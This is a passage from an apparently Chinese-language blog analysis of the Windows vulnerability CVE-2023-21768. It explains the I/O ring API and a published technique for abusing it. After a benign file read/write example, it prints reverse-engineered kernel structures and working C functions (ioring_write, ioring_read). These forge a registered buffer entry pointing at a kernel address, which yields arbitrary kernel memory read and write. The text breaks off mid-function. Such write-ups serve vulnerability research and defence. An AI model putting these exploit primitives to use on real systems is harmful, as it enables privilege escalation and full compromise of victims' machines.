中可用的操作包括读取、写入、刷新和取消。请求的操作被写入提交队列，然后一起提交。内核处理请求并将状态代码写入完成队列——两个队列都在用户模式和内核模式均可访问的共享内存区域中<br><br>此技术使用的就是预注册输出缓冲区文件读写，其设计到的函数有<span class="hljs-variable">BuildIoRingReadFile</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>，<span class="hljs-variable">BuildIoRingRegisterBuffers</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>，<span class="hljs-variable">BuildIoRingWriteFile</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><ul><li><p>编写一个正常使用API函数实现预注册输出缓冲区文件读写的代码，然后和不正常的方法进行对比</p><ul><li><p>CreateIoRing创建IORING</p></li><li><p>BuildIoRingRegisterBuffers()申请了2个缓冲区，可通过IoRingBufferRefFromIndexAndOffset的第一个参数来决定用哪一个。</p></li><li><p>BuildIoRingReadFile()，读文件中的abc。</p></li><li><p>BuildIoRingWriteFile()，向文件中偏移为3的位置写ABC。</p></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntstatus.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WIN32_NO_STATUS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ioringapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrin.h&gt;</span></span><br> <br> <br>HIORING handle = <span class="hljs-literal">NULL</span>;<br> <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RegisterBuffersfileReadWrite</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    HRESULT result;<br>    IORING_CREATE_FLAGS flags;<br>    IORING_BUFFER_INFO *buffers;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count=<span class="hljs-number">2</span>;<br>    UINT32 submittedEntries;<br> <br>    <span class="hljs-comment">//创建一个IORING</span><br>    flags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;<br>    flags.Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;<br>    result = <span class="hljs-built_in">CreateIoRing</span>(IORING_VERSION_3, flags, <span class="hljs-number">0x10000</span>, <span class="hljs-number">0x20000</span>, &amp;handle);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">SUCCEEDED</span>(result))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed creating IO ring handle: 0x%x\n&quot;</span>, result);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">//预注册输出缓冲区，两个</span><br>    buffers=(IORING_BUFFER_INFO*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(IORING_BUFFER_INFO) * count, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br> <br>    buffers[<span class="hljs-number">0</span>].Address = (<span class="hljs-type">void</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x20</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br>    buffers[<span class="hljs-number">0</span>].Length = <span class="hljs-number">0x20</span>;<br>    buffers[<span class="hljs-number">1</span>].Address = (<span class="hljs-type">void</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x10</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(buffers[<span class="hljs-number">1</span>].Address, <span class="hljs-string">&quot;ABC&quot;</span>, <span class="hljs-number">0x3</span>);<br>    buffers[<span class="hljs-number">1</span>].Length = <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">BuildIoRingRegisterBuffers</span>(handle,<span class="hljs-number">2</span>, buffers, <span class="hljs-number">0</span>);<br> <br>    <span class="hljs-comment">//获取文件句柄</span><br>    HANDLE hFile = <span class="hljs-built_in">CreateFile</span>(<span class="hljs-string">&quot;C:\\Users\\25077\\Desktop\\test\\ioRing.txt&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed to open file. Error code: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br> <br>    IORING_HANDLE_REF requestDataFile=<span class="hljs-built_in">IoRingHandleRefFromHandle</span>(hFile);<br>    <span class="hljs-comment">//用第一个来读</span><br>    IORING_BUFFER_REF requestDataBuffer = <span class="hljs-built_in">IoRingBufferRefFromIndexAndOffset</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    result = <span class="hljs-built_in">BuildIoRingReadFile</span>(handle,requestDataFile, requestDataBuffer, <span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>,<span class="hljs-literal">NULL</span>, IOSQE_FLAGS_NONE);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">SUCCEEDED</span>(result))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed building IO ring read file structure: 0x%x\n&quot;</span>, result);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">//用第二个来写</span><br>    requestDataBuffer = <span class="hljs-built_in">IoRingBufferRefFromIndexAndOffset</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    result = <span class="hljs-built_in">BuildIoRingWriteFile</span>(handle, requestDataFile, requestDataBuffer, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x3</span>, FILE_WRITE_FLAGS_NONE, <span class="hljs-literal">NULL</span>, IOSQE_FLAGS_NONE);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">SUCCEEDED</span>(result))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed building IO ring Write file structure: 0x%x\n&quot;</span>, result);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//提交</span><br>    result = <span class="hljs-built_in">SubmitIoRing</span>(handle, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">SUCCEEDED</span>(result))<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed submitting IO ring: 0x%x\n&quot;</span>, result);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">//打印读取到的数据</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buffers[<span class="hljs-number">0</span>].Address);<br> <br>    <span class="hljs-keyword">if</span> (handle != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">CloseIoRing</span>(handle);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (hFile)<br>    &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hFile);<br>    &#125;<br>    <span class="hljs-built_in">VirtualFree</span>(buffers[<span class="hljs-number">0</span>].Address, <span class="hljs-number">0x20</span>, MEM_RELEASE);<br>    <span class="hljs-built_in">VirtualFree</span>(buffers[<span class="hljs-number">1</span>].Address, <span class="hljs-number">0x10</span>, MEM_RELEASE);<br>&#125;<br> <br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">RegisterBuffersfileReadWrite</span>();<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>效果如下</li></ul><img src="/2025/06/23/CVE_2023_21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/20250622224321657.png" class="" title="png"><ul><li><p>上面的情况是我们正常调用相关函数，实现的预注册输出缓冲区文件读写，其过程是非常安全的，其肯定会检测我们读取，或写入的地址是否是用户层的。</p></li><li><p>接下来先看我们CreateIoRing创建IORING时，会创造的两个结构，这些都是Yarden Shafir通过逆向工程获取到的</p></li></ul><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs gauss">typedef <span class="hljs-keyword">struct</span> <span class="hljs-type">_IORING_OBJECT</span><br>&#123;<br>    USHORT <span class="hljs-built_in">Type</span>;                                <span class="hljs-comment">// 结构体类型</span><br>    USHORT Size;                                <span class="hljs-comment">// 结构体大小</span><br>    NT_IORING_INFO UserInfo;                    <span class="hljs-comment">// 包含IO环信息的结构体，包括IO环的大小、版本、队列大小等详细信息</span><br>    PVOID Section;                              <span class="hljs-comment">// 内存映射文件Section对象的指针</span><br>    PNT_IORING_SUBMISSION_QUEUE SubmissionQueue;<span class="hljs-comment">// 存储IO请求的Submission Queue的指针</span><br>    PMDL CompletionQueueMdl;                    <span class="hljs-comment">// 缓存Completion Queue的MDL的指针</span><br>    PNT_IORING_COMPLETION_QUEUE CompletionQueue;<span class="hljs-comment">// 存储IO请求完成状态的Completion Queue的指针</span><br>    ULONG64 ViewSize;                           <span class="hljs-comment">// 映射视图的大小</span><br>    ULONG InSubmit;                             <span class="hljs-comment">// IO请求的数量</span><br>    ULONG64 CompletionLock;                     <span class="hljs-comment">// 保护计数器的锁，在读取CQring时使用</span><br>    ULONG64 SubmitCount;                        <span class="hljs-comment">// 已提交IO请求SQEs的数量</span><br>    ULONG64 CompletionCount;                    <span class="hljs-comment">// 已完成的IO请求数量</span><br>    ULONG64 CompletionWaitUntil;                <span class="hljs-comment">// 等待完成IO请求的时间，当完成请求缓存区被解锁时使用</span><br>    KEVENT CompletionEvent;                     <span class="hljs-comment">// 内核事件，在IO请求完成时发出</span><br>    UCHAR SignalCompletionEvent;                <span class="hljs-comment">// 是否使用信号量发出完成事件的标志</span><br>    PKEVENT CompletionUserEvent;                <span class="hljs-comment">// 一个与CompletionEvent成分的用户事件。用户可以使用此事件来通知一个或多个等待线程，IO请求已完成。</span><br>    ULONG RegBuffersCount;                      <span class="hljs-comment">// 注册的缓冲区数量</span><br>    PVOID RegBuffers;                           <span class="hljs-comment">// 已注册的缓冲区列表的指针</span><br>    ULONG RegFilesCount;                        <span class="hljs-comment">// (异步)读取操作所涉及的文件句柄的数量</span><br>    PVOID* RegFiles;                            <span class="hljs-comment">// (异步)读取操作所涉及的文件句柄列表的指针</span><br>&#125; IORING_OBJECT, *PIORING_OBJECT;<br></code></pre></td></tr></table></figure><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs thrift"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">HIORING</span></span><br><span class="hljs-class"></span>&#123;<br>    HANDLE handle;                          <span class="hljs-comment">// IO环操作对象的句柄</span><br>    NT_IORING_INFO Info;                    <span class="hljs-comment">// 包含IO环信息的结构体，包括IO环的大小、版本、队列大小等详细信息</span><br>    ULONG IoRingKernelAcceptedVersion;      <span class="hljs-comment">// 内核支持的IO环版本号</span><br>    PVOID RegBufferArray;                   <span class="hljs-comment">// 注册缓冲区的指针，用于注册IO缓冲区</span><br>    ULONG BufferArraySize;                  <span class="hljs-comment">// 注册缓冲区的大小</span><br>    PVOID Unknown;                          <span class="hljs-comment">// 未知指针，可能提供额外的信息</span><br>    ULONG FileHandlesCount;                 <span class="hljs-comment">// IO环管理的文件句柄数量</span><br>    ULONG SubQueueHead;                     <span class="hljs-comment">// IO环子队列的头部索引</span><br>    ULONG SubQueueTail;                     <span class="hljs-comment">// IO环子队列的尾部索引</span><br>&#125; _HIORING;<br></code></pre></td></tr></table></figure><ul><li><p>上面两个结构体中我们需要注意的是下面的参数，分别是注册缓冲区的指针，其是相对应的，值应该也是一样的。</p><ul><li><p>_IORING_OBJECT中的RegBuffers和RegBuffersCount</p></li><li><p>_HIORING的RegBufferArray和BufferArraySize</p></li></ul></li><li><p>根据Yarden Shafir的研究发现，或许我们可以不调用BuildIoRingRegisterBuffers()去注册缓冲区，如果我们能直接控制注册缓冲区的指针(IoRing-&gt;RegBuffers)直接指向我们自己的一个假缓冲区，也可以被认为我们注册了缓冲区，然后再控制列表当中的Address地址为内核的地址，再结合读写文件，就可以做到任意内核地址读写，并且这种并不会被探测。</p></li><li><p>当然由于我们要修改IoRing-&gt;RegBuffers，这个地址在内核空间，所以前提是得有个内核任意地址写漏洞。</p></li><li><p>注意的是在Windows 11 22H2版本下，内核中的缓冲区数组不再是地址和长度的平面数组(IORING_BUFFER_INFO)，而是一个新的结构体。</p></li></ul><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gauss">typedef <span class="hljs-keyword">struct</span> <span class="hljs-type">_IOP_MC_BUFFER_ENTRY</span><br>&#123;<br>    USHORT <span class="hljs-built_in">Type</span>;                            <span class="hljs-comment">// 结构体类型</span><br>    USHORT Reserved;                        <span class="hljs-comment">// 保留字段</span><br>    ULONG Size;                             <span class="hljs-comment">// 结构体大小</span><br>    ULONG ReferenceCount;                   <span class="hljs-comment">// 结构体引用计数</span><br>    ULONG Flags;                            <span class="hljs-comment">// 标志位</span><br>    LIST_ENTRY GlobalDataLink;              <span class="hljs-comment">// 全局数据链接列表</span><br>    PVOID Address;                          <span class="hljs-comment">// 缓冲区的地址</span><br>    ULONG Length;                           <span class="hljs-comment">// 缓冲区的长度</span><br>    CHAR AccessMode;                        <span class="hljs-comment">// 缓冲区的访问模式</span><br>    ULONG MdlRef;                           <span class="hljs-comment">// 缓冲区的MDL引用数</span><br>    PMDL Mdl;                               <span class="hljs-comment">// 缓冲区的MDL</span><br>    KEVENT MdlRundownEvent;                 <span class="hljs-comment">// 缓冲区的MDL结束事件</span><br>    PULONG64 PfnArray;                      <span class="hljs-comment">// 物理页帧号数组的指针</span><br>    IOP_MC_BE_PAGE_NODE PageNodes[<span class="hljs-number">1</span>];       <span class="hljs-comment">// 物理页节点数组</span><br>&#125; IOP_MC_BUFFER_ENTRY, *PIOP_MC_BUFFER_ENTRY;<br></code></pre></td></tr></table></figure><ul><li>需要这样初始一下。</li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">mcBufferEntry</span>-&gt;</span>Address = TargetAddress;<br><span class="hljs-function"><span class="hljs-title">mcBufferEntry</span>-&gt;</span>Length = Length;<br><span class="hljs-function"><span class="hljs-title">mcBufferEntry</span>-&gt;</span>Type = <span class="hljs-number">0</span>xc02;<br><span class="hljs-function"><span class="hljs-title">mcBufferEntry</span>-&gt;</span>Size = <span class="hljs-number">0</span>x80; <span class="hljs-comment">// 0x20 * (numberOfPagesInBuffer + 3)</span><br><span class="hljs-function"><span class="hljs-title">mcBufferEntry</span>-&gt;</span>AccessMode = <span class="hljs-number">1</span>;<br><span class="hljs-function"><span class="hljs-title">mcBufferEntry</span>-&gt;</span>ReferenceCount = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><ul><li><p>步骤如下</p><ul><li><p>先将value写入到文件中，WriteFile()</p></li><li><p>设置好要写的内核地址TargetAddress</p></li><li><p>调用BuildIoRingReadFile()，读取文件内容到缓冲区，也就是TargetAddress</p></li></ul></li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-type">int</span> ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen)<br>&#123;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">-1</span>;<br>    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = <span class="hljs-literal">NULL</span>;<br>    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);<br>    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    IORING_CQE cqe = &#123; <span class="hljs-number">0</span> &#125;;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == WriteFile(hInPipe, pWriteBuffer, ulWriteLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>    &#123;<br>        ret = GetLastError();<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pMcBufferEntry)<br>    &#123;<br>        ret = GetLastError();<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    pMcBufferEntry-&gt;Address = (PVOID)pWriteAddr;<br>    pMcBufferEntry-&gt;Length = ulWriteLen;<br>    pMcBufferEntry-&gt;Type = <span class="hljs-number">0xc02</span>;<br>    pMcBufferEntry-&gt;Size = <span class="hljs-number">0x80</span>;<br>    pMcBufferEntry-&gt;AccessMode = <span class="hljs-number">1</span>;<br>    pMcBufferEntry-&gt;ReferenceCount = <span class="hljs-number">1</span>;<br> <br>    pRegisterBuffers[<span class="hljs-number">0</span>] = (ULONG64)pMcBufferEntry;<br> <br>    ret = BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, ulWriteLen, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, IOSQE_FLAGS_NONE);<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != ret)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    ret = SubmitIoRing(hIoRing, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != ret)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    ret = PopIoRingCompletion(hIoRing, &amp;cqe);<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != ret)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != cqe.ResultCode)<br>    &#123;<br>        ret = cqe.ResultCode;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    ret = <span class="hljs-number">0</span>;<br> <br>done:<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != pMcBufferEntry)<br>    &#123;<br>        VirtualFree(pMcBufferEntry, <span class="hljs-keyword">sizeof</span>(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h4><ul><li><p>步骤如下</p><ul><li><p>设置好要读的内核地址TargetAddress</p></li><li><p>调用BuildIoRingWriteFile，将TargetAddress的值写入到文件</p></li><li><p>ReadFile读取文件里面的值</p></li></ul></li></ul><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-type">int</span> ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)<br>&#123;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">-1</span>;<br>    PIOP_MC_BUFFER_ENTRY pMcBufferEntry = <span class="hljs-literal">NULL</span>;<br>    IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);<br>    IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    IORING_CQE cqe = &#123; <span class="hljs-number">0</span> &#125;;<br> <br>    pMcBufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == pMcBufferEntry)<br>    &#123;<br>        ret = GetLastError();<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    pMcBufferEntry-&gt;Address = (PVOID)pReadAddr;<br>    pMcBufferEntry-&gt;Length = ulReadLen;<br>    pMcBufferEntry-&gt;Type = <span class="hljs-number">0xc02</span>;<br>    pMcBufferEntry-&gt;Size = <span class="hljs-number">0x80</span>;<br>    pMcBufferEntry-&gt;AccessMode = <span class="hljs-number">1</span>;<br>    pMcBufferEntry-&gt;ReferenceCount = <span class="hljs-number">1</span>;<br> <br>    pRegisterBuffers[<span class="hljs-number">0</span>] = (ULONG64)pMcBufferEntry;<br> <br> <br> <br>    ret = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, <span class="hljs-number">0</span>, FILE_WRITE_FLAGS_NONE, <span class="hljs-literal">NULL</span>, IOSQE_FLAGS_NONE);<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != ret)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    ret = SubmitIoRing(hIoRing, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != ret)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    ret = PopIoRingCompletion(hIoRing, &amp;cqe);<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != ret)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> != cqe.ResultCode)<br>    &#123;<br>        ret = cqe.ResultCode;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == ReadFile(hOutPipe, pReadBuffer, ulReadLen, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>    &#123;<br>        ret = GetLastError();<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br> <br>    ret = <span class="hljs-number">0</span>;<br> <br>done:<br>    <span class="hljs-keyword">if</span> 